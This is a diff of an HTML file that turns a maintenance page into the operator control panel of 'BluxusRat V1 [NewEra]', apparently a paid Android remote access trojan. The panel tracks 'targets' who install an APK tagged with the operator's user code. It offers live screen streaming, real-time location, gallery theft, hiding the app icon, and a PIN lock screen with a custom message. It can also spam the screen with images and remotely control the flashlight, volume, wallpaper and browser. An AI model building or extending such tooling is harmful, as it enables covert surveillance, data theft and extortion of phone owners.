@@ -3,294 +3,574 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Maintenance — BluxusRat</title>
+<title>BluxusRat V1 [NewEra]</title>
+<link rel="icon" href="assets/icon-app.png">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700;800&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-<style>
-*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-html,body{height:100%;overflow:hidden}
-body{font-family:'Inter',system-ui,sans-serif;background:#050304;color:#f5f5f5;-webkit-font-smoothing:antialiased;-webkit-tap-highlight-color:transparent;user-select:none;overscroll-behavior:none}
-a{color:inherit;text-decoration:none}
-:root{--bg:#050304;--bg-app:#0d0709;--bg-card:#160d10;--border:rgba(255,255,255,0.06);--text:#f5f5f5;--text-dim:#a39599;--text-mute:#5a4548;--accent:#c41e28;--accent-hover:#e02630;--accent-glow:rgba(196,30,40,0.4);--success:#2ed573;--warning:#ffa502;--info:#70a1ff;--trans:.2s cubic-bezier(0.4,0,0.2,1)}
-body{background:radial-gradient(circle at 20% 10%,rgba(196,30,40,0.15) 0%,transparent 45%),radial-gradient(circle at 80% 90%,rgba(124,58,237,0.08) 0%,transparent 45%),#050304;display:flex;align-items:center;justify-content:center;padding:20px;position:relative;overflow:hidden}
-
-@keyframes gridMove{from{background-position:0 0}to{background-position:40px 40px}}
-@keyframes float1{0%,100%{transform:translate(0,0)}50%{transform:translate(60px,60px)}}
-@keyframes float2{0%,100%{transform:translate(0,0)}50%{transform:translate(-60px,-60px)}}
-@keyframes spin{to{transform:rotate(360deg)}}
-@keyframes spinSlow{to{transform:rotate(360deg)}}
-@keyframes iconPulse{0%,100%{transform:scale(1);filter:drop-shadow(0 0 20px rgba(196,30,40,0.4))}50%{transform:scale(1.05);filter:drop-shadow(0 0 35px rgba(196,30,40,0.7))}}
-@keyframes dotBlink{0%,100%{opacity:1}50%{opacity:.3}}
-@keyframes progressMove{0%{transform:translateX(-100%)}100%{transform:translateX(400%)}}
-@keyframes fadeInUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
-@keyframes topBorder{0%,100%{opacity:.3}50%{opacity:1}}
-@keyframes wifiPulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(.95)}}
-
-/* BG */
-.bg-grid{position:fixed;inset:0;z-index:0;background-image:linear-gradient(rgba(196,30,40,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(196,30,40,0.03) 1px,transparent 1px);background-size:40px 40px;animation:gridMove 20s linear infinite;pointer-events:none}
-.bg-glow{position:fixed;width:600px;height:600px;border-radius:50%;filter:blur(120px);opacity:.35;z-index:0;pointer-events:none}
-.bg-glow-1{top:-200px;left:-200px;background:var(--accent);animation:float1 15s ease-in-out infinite}
-.bg-glow-2{bottom:-200px;right:-200px;background:#7c3aed;animation:float2 18s ease-in-out infinite}
-
-/* CONTAINER */
-.container{position:relative;z-index:2;width:100%;max-width:520px;display:flex;flex-direction:column;gap:18px;animation:fadeInUp .6s ease;max-height:100dvh;overflow-y:auto;padding:20px 0}
-.container::-webkit-scrollbar{width:0}
-
-/* ICON */
-.icon-wrap{display:flex;justify-content:center;margin-bottom:4px;position:relative}
-.icon{width:110px;height:110px;border-radius:32px;background:linear-gradient(135deg,rgba(196,30,40,0.25),rgba(196,30,40,0.05));border:1px solid rgba(196,30,40,0.3);display:flex;align-items:center;justify-content:center;position:relative;box-shadow:0 20px 60px var(--accent-glow),inset 0 1px 0 rgba(255,255,255,0.1);animation:iconPulse 2.5s ease-in-out infinite}
-.icon i{font-size:52px;color:var(--accent-hover)}
-.icon::before{content:'';position:absolute;inset:-10px;border-radius:38px;border:2px dashed rgba(196,30,40,0.3);animation:spinSlow 25s linear infinite}
-.icon.offline{background:linear-gradient(135deg,rgba(255,165,2,0.25),rgba(255,165,2,0.05));border-color:rgba(255,165,2,0.3);box-shadow:0 20px 60px rgba(255,165,2,0.4),inset 0 1px 0 rgba(255,255,255,0.1)}
-.icon.offline i{color:#ffa502;animation:wifiPulse 2s ease-in-out infinite}
-.icon.offline::before{border-color:rgba(255,165,2,0.3)}
-
-/* BADGE */
-.badge{display:inline-flex;align-items:center;gap:8px;padding:8px 18px;border-radius:20px;background:rgba(196,30,40,0.12);border:1px solid rgba(196,30,40,0.3);color:var(--accent-hover);font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:2px;margin:0 auto;position:relative}
-.badge .dot{width:8px;height:8px;border-radius:50%;background:var(--accent-hover);box-shadow:0 0 10px var(--accent-glow);animation:dotBlink 1.5s ease-in-out infinite}
-.badge.warning{background:rgba(255,165,2,0.12);border-color:rgba(255,165,2,0.3);color:#ffa502}
-.badge.warning .dot{background:#ffa502;box-shadow:0 0 10px #ffa502}
-
-/* CARD */
-.card{background:rgba(13,7,9,0.9);backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);border:1px solid var(--border);border-radius:28px;padding:34px 26px;box-shadow:0 30px 80px rgba(0,0,0,0.6),inset 0 1px 0 rgba(255,255,255,0.05);text-align:center;position:relative;overflow:hidden}
-.card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,transparent,var(--accent),transparent);animation:topBorder 3s ease-in-out infinite}
-.card.offline::before{background:linear-gradient(90deg,transparent,#ffa502,transparent)}
-
-.title{font-family:'Poppins',sans-serif;font-size:28px;font-weight:800;letter-spacing:-1.2px;background:linear-gradient(135deg,#fff 40%,var(--accent));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:6px;line-height:1.15}
-.card.offline .title{background:linear-gradient(135deg,#fff 40%,#ffa502);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
-.subtitle{font-family:'Poppins',sans-serif;font-size:11px;font-weight:600;color:var(--text-dim);letter-spacing:3px;text-transform:uppercase;margin-bottom:22px}
-.message{font-size:13px;color:var(--text);line-height:1.8;margin-bottom:20px;padding:16px;background:rgba(196,30,40,0.06);border:1px solid rgba(196,30,40,0.15);border-radius:16px;text-align:left}
-.card.offline .message{background:rgba(255,165,2,0.06);border-color:rgba(255,165,2,0.15)}
-.message i{color:var(--accent-hover);margin-right:6px}
-.card.offline .message i{color:#ffa502}
-
-/* INFO LIST */
-.info-list{display:flex;flex-direction:column;gap:8px;margin-bottom:20px}
-.info-item{display:flex;align-items:center;gap:12px;padding:12px 14px;background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:12px;text-align:left}
-.info-item .ico{width:32px;height:32px;border-radius:9px;background:rgba(196,30,40,0.12);display:flex;align-items:center;justify-content:center;flex-shrink:0}
-.info-item .ico i{font-size:13px;color:var(--accent-hover)}
-.card.offline .info-item .ico{background:rgba(255,165,2,0.12)}
-.card.offline .info-item .ico i{color:#ffa502}
-.info-item .txt{flex:1;min-width:0}
-.info-item .txt .l{font-size:9px;color:var(--text-mute);text-transform:uppercase;letter-spacing:1.2px;font-weight:700;margin-bottom:2px}
-.info-item .txt .v{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:600;color:var(--text);word-break:break-all}
-.info-item .txt .v.warn{color:#ffa502}
-.info-item .txt .v.ok{color:var(--success)}
-
-/* PROGRESS */
-.progress{width:100%;height:4px;background:rgba(255,255,255,0.05);border-radius:2px;overflow:hidden;margin-bottom:18px;position:relative}
-.progress .fill{height:100%;width:30%;background:linear-gradient(90deg,transparent,var(--accent),transparent);border-radius:2px;animation:progressMove 2s ease-in-out infinite;box-shadow:0 0 12px var(--accent-glow)}
-.card.offline .progress .fill{background:linear-gradient(90deg,transparent,#ffa502,transparent);box-shadow:0 0 12px rgba(255,165,2,0.5)}
-
-/* CONTACT */
-.contact-row{display:flex;gap:8px;margin-bottom:18px}
-.contact-btn{flex:1;padding:12px 8px;background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:12px;display:flex;flex-direction:column;align-items:center;gap:5px;color:var(--text);font-size:10px;font-weight:600;transition:all .2s}
-.contact-btn:active{transform:scale(.96);background:rgba(255,255,255,0.06)}
-.contact-btn i{font-size:16px}
-.contact-btn.wa i{color:#25D366}
-.contact-btn.ch i{color:var(--accent-hover)}
-.contact-btn.gr i{color:var(--info)}
-
-/* FOOTER */
-.footer{text-align:center;font-size:10px;color:var(--text-mute);line-height:1.6;padding:0 16px}
-.footer .brand{font-family:'Poppins',sans-serif;font-weight:800;background:linear-gradient(135deg,#fff 40%,var(--accent));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;font-size:12px;letter-spacing:-.5px}
-
-/* RESPONSIVE */
-@media (max-width:420px){
-.title{font-size:22px}
-.card{padding:26px 18px}
-.icon{width:90px;height:90px}
-.icon i{font-size:42px}
-.contact-row{flex-wrap:wrap}
-.contact-btn{min-width:calc(50% - 4px)}
-}
-</style>
+<link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-<div class="bg-grid"></div>
-<div class="bg-glow bg-glow-1"></div>
-<div class="bg-glow bg-glow-2"></div>
+<div id="conn-dot"></div>
 
-<div class="container">
+<div id="app">
+<div class="app-shell">
 
-<div class="icon-wrap">
-<div class="icon" id="mainIcon"><i class="fa-solid fa-screwdriver-wrench" id="iconEl"></i></div>
+<!-- LOADING -->
+<div class="screen active" id="screen-loading">
+<div class="brand-logo">BluxusRat</div>
+<div class="brand-sub">V1 [NewEra]</div>
+<div class="brand-ver">Control Panel</div>
+<div class="progress-wrap"><div class="progress-fill" id="progress-fill"></div></div>
+<div id="loading-text">Connecting to Firebase...</div>
 </div>
 
-<div class="badge" id="statusBadge">
-<span class="dot"></span>
-<span id="statusText">Sedang Maintenance</span>
+<!-- LOGIN -->
+<div class="screen" id="screen-login">
+<div class="banner-wrap">
+<img src="assets/banner-login.png" onerror="this.style.display='none'">
+<div class="banner-title">BluxusRat</div>
+<div class="banner-sub">V1 [NewEra]</div>
+</div>
+<div class="form-zone">
+<div class="card">
+<div class="card-title">Sign In</div>
+<div class="field">
+<label>Username</label>
+<div class="input-wrap">
+<div class="ico-badge"><i class="fa-solid fa-user"></i></div>
+<input type="text" id="login-usn" placeholder="username">
+</div>
+</div>
+<div class="field">
+<label>Password</label>
+<div class="input-wrap">
+<div class="ico-badge"><i class="fa-solid fa-lock"></i></div>
+<input type="password" id="login-pw" placeholder="••••••••">
+</div>
+</div>
+<button class="btn btn-primary ripple" id="btn-login"><i class="fa-solid fa-right-to-bracket"></i> Login</button>
+<div class="login-redirect" id="login-redirect"><div class="spin"></div><span>Mengalihkan...</span></div>
+<div class="login-meta">BluxusRat V1 — NewEra</div>
+</div>
+</div>
 </div>
 
-<div class="card" id="mainCard">
-<div class="title" id="cardTitle">BluxusRat</div>
-<div class="subtitle" id="cardSubtitle">V1 [NewEra]</div>
-
-<div class="message" id="cardMessage">
-<i class="fa-solid fa-circle-info"></i>
-Server sedang dalam proses maintenance. Kami sedang melakukan peningkatan sistem untuk pengalaman yang lebih baik. Silakan coba beberapa saat lagi.
+<!-- DASHBOARD -->
+<div class="screen" id="screen-dash">
+<div class="dash-header">
+<div class="hamburger" id="btn-hamburger"><i class="fa-solid fa-bars"></i></div>
+<span class="logo-text">BluxusRat</span>
+<div style="width:40px"></div>
+</div>
+<div class="dash-body">
+<div class="welcome-banner fade-in">
+<img src="assets/banner-welcome.png" onerror="this.style.display='none'">
+<div class="wb-badge" id="dash-badge">MEMBER</div>
+<div class="wb-text">
+<div class="w">Welcome back, <span id="dash-welcome-name">User</span></div>
+<div class="s">Control panel siap</div>
+</div>
+</div>
+<div class="user-card fade-in-1">
+<div class="content">
+<div class="left">
+<div class="label">Username</div>
+<div class="usn" id="dash-usn">—</div>
+<div class="role" id="dash-role"><i class="fa-solid fa-user"></i> member</div>
+</div>
+<div class="right">
+<div class="label">User Code</div>
+<div class="val mono" id="dash-usercode">—</div>
+</div>
+</div>
+</div>
+<div class="mini-grid fade-in-2">
+<div class="mini-card">
+<div class="ico-badge"><i class="fa-solid fa-crosshairs"></i></div>
+<div class="info"><div class="label">Targets</div><div class="val" id="dash-targets">0</div></div>
+</div>
+<div class="mini-card">
+<div class="ico-badge"><i class="fa-solid fa-wifi"></i></div>
+<div class="info"><div class="label">Online</div><div class="val" id="dash-online">0</div></div>
+</div>
+</div>
+<div id="announce-wrap" class="fade-in-3"></div>
+</div>
 </div>
 
-<div class="info-list">
-<div class="info-item">
-<div class="ico"><i class="fa-solid fa-signal"></i></div>
-<div class="txt"><div class="l">Status Server</div><div class="v warn" id="infoStatus">Maintenance</div></div>
+<!-- RAT -->
+<div class="screen" id="screen-rat">
+<div class="dash-header">
+<div class="hamburger" id="btn-hamburger-rat"><i class="fa-solid fa-bars"></i></div>
+<span class="page-title">Rat</span>
+<div style="width:40px"></div>
 </div>
-<div class="info-item">
-<div class="ico"><i class="fa-solid fa-wifi"></i></div>
-<div class="txt"><div class="l">Jaringan</div><div class="v ok" id="infoNetwork">Terhubung</div></div>
+<div class="dash-body">
+<div class="usercode-card fade-in">
+<div class="uc-head">
+<div class="ico-badge"><i class="fa-solid fa-key"></i></div>
+<div><div class="t">User Code Kamu</div><div class="d">Taruh di config.json APK</div></div>
 </div>
-<div class="info-item">
-<div class="ico"><i class="fa-solid fa-code-branch"></i></div>
-<div class="txt"><div class="l">Versi</div><div class="v" id="infoVersion">v1.0.0</div></div>
+<div class="uc-row">
+<div class="uc-code" id="rat-usercode">—</div>
+<button class="uc-copy ripple" id="btn-copy-usercode"><i class="fa-solid fa-copy"></i></button>
 </div>
-<div class="info-item">
-<div class="ico"><i class="fa-solid fa-clock"></i></div>
-<div class="txt"><div class="l">Waktu Cek</div><div class="v" id="infoTime">—</div></div>
+<div class="uc-info"><i class="fa-solid fa-circle-info"></i><span>Code ini buat identifikasi target yang install APK kamu.</span></div>
+</div>
+<div class="section fade-in-1">
+<h3><div class="ico-badge"><i class="fa-solid fa-satellite-dish"></i></div> Target List</h3>
+<div class="target-list" id="target-list">
+<div class="skeleton"></div>
+<div class="skeleton"></div>
+</div>
+</div>
 </div>
 </div>
 
-<div class="progress"><div class="fill"></div></div>
+<!-- TARGET DETAIL -->
+<div class="screen" id="screen-target">
+<div class="dash-header">
+<div class="hamburger" id="btn-target-back"><i class="fa-solid fa-arrow-left"></i></div>
+<span class="page-title" id="target-title">Target</span>
+<div style="width:40px"></div>
+</div>
+<div class="dash-body">
+<div class="feature-grid" id="feature-grid"></div>
 
-<div class="contact-row">
-<a class="contact-btn wa" href="https://wa.me/6283137236898" target="_blank"><i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span></a>
-<a class="contact-btn ch" href="https://whatsapp.com/channel/0029VbD9HztKrWQuuymMCU0w" target="_blank"><i class="fa-solid fa-bullhorn"></i><span>Channel</span></a>
-<a class="contact-btn gr" href="https://chat.whatsapp.com/ImF67mLQSnZ8xYwKpMO4EU" target="_blank"><i class="fa-solid fa-comments"></i><span>Grup</span></a>
+<!-- INFO DEVICE -->
+<div class="feature-page" id="fp-info">
+<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Info Device</div></div>
+<div class="fp-desc">Detail lengkap device target. Data terupdate otomatis.</div>
+<div class="info-grid" id="info-content"></div>
+</div>
+
+<!-- LIVE CAM -->
+<div class="feature-page" id="fp-live">
+<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Live Cam</div></div>
+<div class="fp-desc">Stream layar target secara real-time. Mendukung semua versi Android.</div>
+<div class="toggle-row" id="live-toggle-row">
+<div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-video"></i></div><div class="tr-info"><div class="n">Aktifkan Live Cam</div><div class="d">Stream layar target</div></div></div>
+<label class="switch"><input type="checkbox" id="sw-live"><span class="slider"></span></label>
+</div>
+<div class="fps-control" id="fps-control">
+<div class="fps-label"><i class="fa-solid fa-gauge-high"></i> FPS: <span id="fps-value">2</span></div>
+<input type="range" id="fps-slider" min="1" max="30" value="2" class="range-input">
+</div>
+<div class="live-view" id="live-view"><div class="empty"><i class="fa-solid fa-spinner fa-spin"></i><div>Live cam nonaktif</div></div></div>
+</div>
+
+<!-- LOCATE -->
+<div class="feature-page" id="fp-locate">
+<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Locate</div></div>
+<div class="fp-desc">Ambil lokasi target secara real-time + alamat lengkap.</div>
+<div class="toggle-row">
+<div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-location-dot"></i></div><div class="tr-info"><div class="n">Aktifkan Locate</div><div class="d">Lokasi target</div></div></div>
+<label class="switch"><input type="checkbox" id="sw-loc"><span class="slider"></span></label>
+</div>
+<div class="loading-overlay hidden" id="loc-loading"><div class="loader"></div><div class="loading-text">Mencari lokasi target...</div></div>
+<div class="loc-map" id="loc-map"><div class="empty"><i class="fa-solid fa-map-location-dot"></i><div>Locate nonaktif</div></div></div>
+<div class="loc-info" id="loc-info">
+<div class="loc-address" id="loc-address">—</div>
+<div class="loc-coords" id="loc-coords">—</div>
+</div>
+</div>
+
+<!-- SENTER & STROBO -->
+<div class="feature-page" id="fp-flash">
+<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Senter & Strobo</div></div>
+<div class="fp-desc">Kontrol senter target. Strobo bakal kedip terus-terusan.</div>
+<div class="toggle-row">
+<div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-lightbulb"></i></div><div class="tr-info"><div class="n">Senter</div><div class="d">Flashlight target</div></div></div>
+<label class="switch"><input type="checkbox" id="sw-flash"><span class="slider"></span></label>
+</div>
+<div class="toggle-row">
+<div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-bolt"></i></div><div class="tr-info"><div class="n">Strobo</div><div class="d">Kedip terus tiap 1 detik</div></div></div>
+<label class="switch"><input type="checkbox" id="sw-strobo"><span class="slider"></span></label>
+</div>
+</div>
+
+<!-- KUNCI HP -->
+<div class="feature-page" id="fp-lock">
+<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Kunci HP</div></div>
+<div class="fp-desc">Kunci HP target pake overlay + custom pesan. Target harus masukin PIN yang lo set.</div>
+<div class="section">
+<div class="field"><label>PIN 4 Digit</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-lock"></i></div><input type="tel" id="lock-pin" maxlength="4" placeholder="0000"></div></div>
+<div class="field"><label>Pesan Custom</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-comment"></i></div><input type="text" id="lock-message" placeholder="HP Terkunci" maxlength="50"></div></div>
+<div class="toggle-row">
+<div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-mobile-screen-button"></i></div><div class="tr-info"><div class="n">Status Lock</div><div class="d">Aktifin buat kunci HP target</div></div></div>
+<label class="switch"><input type="checkbox" id="sw-lock"><span class="slider"></span></label>
+</div>
+</div>
+</div>
+
+<!-- VOLUME -->
+<div class="feature-page" id="fp-volume">
+<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Set Volume</div></div>
+<div class="fp-desc">Atur volume HP target.</div>
+<div class="section">
+<div class="slider-row">
+<div class="slider-icon"><i class="fa-solid fa-volume-low"></i></div>
+<input type="range" id="volume-slider" min="0" max="100" value="50" class="range-input">
+<div class="slider-icon"><i class="fa-solid fa-volume-high"></i></div>
+</div>
+<div class="slider-value" id="volume-value">50%</div>
+<button class="btn btn-primary" id="btn-set-volume" style="margin-top:14px"><i class="fa-solid fa-check"></i> Terapkan Volume</button>
+</div>
+</div>
+
+<!-- KECERAHAN -->
+<div class="feature-page" id="fp-brightness">
+<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Set Kecerahan</div></div>
+<div class="fp-desc">Atur kecerahan layar HP target.</div>
+<div class="section">
+<div class="slider-row">
+<div class="slider-icon"><i class="fa-solid fa-sun"></i></div>
+<input type="range" id="brightness-slider" min="0" max="100" value="50" class="range-input">
+<div class="slider-icon"><i class="fa-solid fa-sun" style="font-size:20px"></i></div>
+</div>
+<div class="slider-value" id="brightness-value">50%</div>
+<button class="btn btn-primary" id="btn-set-brightness" style="margin-top:14px"><i class="fa-solid fa-check"></i> Terapkan Kecerahan</button>
+</div>
+</div>
+
+<!-- URL DIRECT -->
+<div class="feature-page" id="fp-url">
+<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">URL Direct</div></div>
+<div class="fp-desc">Buka URL di browser HP target.</div>
+<div class="section">
+<div class="field"><label>URL Target</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-link"></i></div><input type="url" id="url-direct" placeholder="https://example.com"></div></div>
+<button class="btn btn-primary" id="btn-open-url" style="margin-top:8px"><i class="fa-solid fa-arrow-up-right-from-square"></i> Buka URL di Target</button>
+</div>
+</div>
+
+<!-- GALLERY -->
+<div class="feature-page" id="fp-gallery">
+<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Get Gallery</div></div>
+<div class="fp-desc">Ambil semua foto dari galeri target. Foto muncul lengkap.</div>
+<div class="section">
+<button class="btn btn-primary" id="btn-get-gallery"><i class="fa-solid fa-images"></i> Ambil Galeri</button>
+<div class="loading-overlay hidden" id="gallery-loading"><div class="loader"></div><div class="loading-text">Mengambil foto dari target...</div></div>
+<div class="gallery-grid" id="gallery-grid"><div class="empty" style="grid-column:1/-1"><i class="fa-solid fa-image"></i><div>Klik tombol buat ambil galeri target</div></div></div>
+</div>
+</div>
+
+<!-- TOAST -->
+<div class="feature-page" id="fp-toast">
+<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Kirim Toast</div></div>
+<div class="fp-desc">Tampilkan pesan di HP target.</div>
+<div class="section">
+<div class="field"><label>Pesan Toast</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-comment-dots"></i></div><input type="text" id="toast-message" placeholder="Contoh: Halo" maxlength="100"></div></div>
+<button class="btn btn-primary" id="btn-send-toast"><i class="fa-solid fa-paper-plane"></i> Kirim Toast</button>
+</div>
+</div>
+
+<!-- HIDE APP -->
+<div class="feature-page" id="fp-hideapp">
+<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Hide App</div></div>
+<div class="fp-desc">Sembunyikan icon APK di HP target. Work di semua Android.</div>
+<div class="section">
+<button class="btn btn-primary" id="btn-hide-app" style="margin-bottom:10px"><i class="fa-solid fa-eye-slash"></i> Sembunyikan Icon</button>
+<button class="btn btn-ghost" id="btn-show-app"><i class="fa-solid fa-eye"></i> Tampilkan Icon</button>
+</div>
+</div>
+
+<!-- CHANGE WALLPAPER -->
+<div class="feature-page" id="fp-wallpaper">
+<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Change Wallpaper</div></div>
+<div class="fp-desc">Ganti wallpaper HP target. Kasih URL gambar atau upload dari HP kamu.</div>
+<div class="section">
+<div class="field"><label>URL Gambar</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-link"></i></div><input type="url" id="wallpaper-url" placeholder="https://i.imgur.com/xxx.jpg"></div></div>
+<div class="divider">ATAU</div>
+<div class="upload-zone" id="wallpaper-upload-zone">
+<input type="file" id="wallpaper-file" accept="image/*">
+<div class="uz-icon"><i class="fa-solid fa-cloud-arrow-up"></i></div>
+<div class="uz-title">Upload dari HP kamu</div>
+<div class="uz-desc">Max 5 MB</div>
+</div>
+<div class="wallpaper-preview" id="wallpaper-preview" style="display:none"><img id="wallpaper-preview-img" src=""></div>
+<div class="field"><label>Tipe Wallpaper</label>
+<div class="radio-group" id="wallpaper-type">
+<label class="radio-opt active" data-val="home"><input type="radio" name="wptype" value="home" checked> <i class="fa-solid fa-house"></i> Home Screen</label>
+<label class="radio-opt" data-val="lock"><input type="radio" name="wptype" value="lock"> <i class="fa-solid fa-lock"></i> Lock Screen</label>
+<label class="radio-opt" data-val="both"><input type="radio" name="wptype" value="both"> <i class="fa-solid fa-mobile-screen"></i> Keduanya</label>
+</div>
+</div>
+<button class="btn btn-primary" id="btn-apply-wallpaper"><i class="fa-solid fa-image"></i> Terapkan Wallpaper</button>
+</div>
+</div>
+
+<!-- SPAM UI -->
+<div class="feature-page" id="fp-spamui">
+<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Spam UI</div></div>
+<div class="fp-desc">Kirim max 10 foto ke layar HP target. Foto bakal bertebaran dan gak bisa di-dismiss sama target. Stop dari panel ini.</div>
+<div class="section">
+<div class="upload-zone" id="spamui-upload-zone">
+<input type="file" id="spamui-file" accept="image/*" multiple>
+<div class="uz-icon"><i class="fa-solid fa-images"></i></div>
+<div class="uz-title">Pilih 5-10 Foto</div>
+<div class="uz-desc">Max 10 foto, 5 MB per foto</div>
+</div>
+<div class="spamui-list" id="spamui-list"></div>
+<div class="spamui-info" id="spamui-info" style="display:none">
+<div class="spamui-count">Total: <b id="spamui-count">0</b> foto</div>
+<button class="btn btn-ghost btn-sm" id="btn-spamui-clear"><i class="fa-solid fa-trash"></i> Hapus Semua</button>
+</div>
+<div class="btn-row">
+<button class="btn btn-primary" id="btn-spamui-start" disabled><i class="fa-solid fa-play"></i> Mulai Spam UI</button>
+<button class="btn btn-danger" id="btn-spamui-stop" style="display:none"><i class="fa-solid fa-stop"></i> Stop Spam UI</button>
+</div>
+</div>
 </div>
 
 </div>
+</div>
 
-<div class="footer">
+<!-- BLUXANIME -->
+<div class="screen" id="screen-anime">
+<div class="anime-header">
+<div class="anime-header-top">
+<div class="anime-header-left">
+<div class="hamburger" id="btn-hamburger-anime"><i class="fa-solid fa-bars"></i></div>
+<div class="anime-logo">BluxAnime</div>
+</div>
+<div class="anime-search-btn" id="btn-anime-search"><i class="fa-solid fa-magnifying-glass"></i></div>
+</div>
+<div class="anime-search-inline" id="anime-search-inline">
+<input type="text" id="anime-search-input" placeholder="Cari anime...">
+<div class="anime-search-close" id="btn-anime-search-close"><i class="fa-solid fa-xmark"></i></div>
+</div>
+</div>
+<div class="anime-body" id="anime-body">
+<div class="anime-banner"><img id="anime-banner-img" src="" onerror="this.style.opacity='0'"></div>
+<div class="anime-title-block">
+<div class="t">BLUXANIME</div>
+<div class="s">Nonton anime subtitle Indonesia gratis</div>
+</div>
+<div class="anime-rows" id="anime-rows"><div class="anime-loading"><div class="sp"></div><span>Loading...</span></div></div>
+</div>
+</div>
+
+<!-- TOOLS -->
+<div class="screen" id="screen-tools">
+<div class="dash-header">
+<div class="hamburger" id="btn-hamburger-tools"><i class="fa-solid fa-bars"></i></div>
+<span class="page-title">Tools</span>
+<div style="width:40px"></div>
+</div>
+<div class="dash-body">
+<div class="section fade-in">
+<h3><div class="ico-badge"><i class="fa-solid fa-toolbox"></i></div> Regular Tools</h3>
+<div class="tools-grid" id="tools-grid"></div>
+</div>
+<div class="vip-section fade-in-1">
+<div class="vip-header">
+<div class="vh-icon"><i class="fa-solid fa-crown"></i></div>
+<div class="vh-text"><div class="n">VIP Tools</div><div class="d">Khusus VIP, Reseller & Owner</div></div>
+</div>
+<div class="tools-grid" id="vip-tools-grid"></div>
+</div>
+</div>
+</div>
+
+<!-- BENEFIT ROLE -->
+<div class="screen" id="screen-benefit">
+<div class="dash-header">
+<div class="hamburger" id="btn-hamburger-benefit"><i class="fa-solid fa-bars"></i></div>
+<span class="page-title">Benefit Role</span>
+<div style="width:40px"></div>
+</div>
+<div class="dash-body">
+<div class="benefit-hero fade-in">
+<div class="bh-icon"><i class="fa-solid fa-medal"></i></div>
+<div class="bh-title">Benefit Role</div>
+<div class="bh-desc">Kenali role di BluxusRat & benefitnya.</div>
+</div>
+<div id="role-cards" class="fade-in-1"></div>
+<div class="section fade-in-2">
+<h3><div class="ico-badge"><i class="fa-solid fa-question"></i></div> FAQ</h3>
+<div id="faq-list"></div>
+</div>
+<button class="btn btn-primary fade-in-3" id="btn-upgrade-role"><i class="fa-solid fa-arrow-up"></i> Upgrade Role</button>
+</div>
+</div>
+
+<!-- ACCOUNT -->
+<div class="screen" id="screen-account">
+<div class="dash-header">
+<div class="hamburger" id="btn-hamburger-account"><i class="fa-solid fa-bars"></i></div>
+<span class="page-title">Account</span>
+<div style="width:40px"></div>
+</div>
+<div class="dash-body">
+<div class="profile-head fade-in">
+<div class="avatar-wrap">
+<img class="avatar" id="acc-avatar" src="" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22 fill=%22%235a4548%22><circle cx=%2212%22 cy=%228%22 r=%224%22/><path d=%22M4 22a8 8 0 0 1 16 0%22/></svg>'">
+<div class="edit" id="btn-change-photo"><i class="fa-solid fa-camera"></i></div>
+</div>
+<div class="uname" id="acc-usn">—</div>
+<div class="urole" id="acc-role">member</div>
+</div>
+<div class="section fade-in-1">
+<div class="info-row"><span class="lbl"><i class="fa-solid fa-key"></i> User Code</span><span class="val mono" id="acc-usercode">—</span></div>
+<div class="info-sep"></div>
+<div class="info-row"><span class="lbl"><i class="fa-solid fa-calendar"></i> Created</span><span class="val" id="acc-created">—</span></div>
+</div>
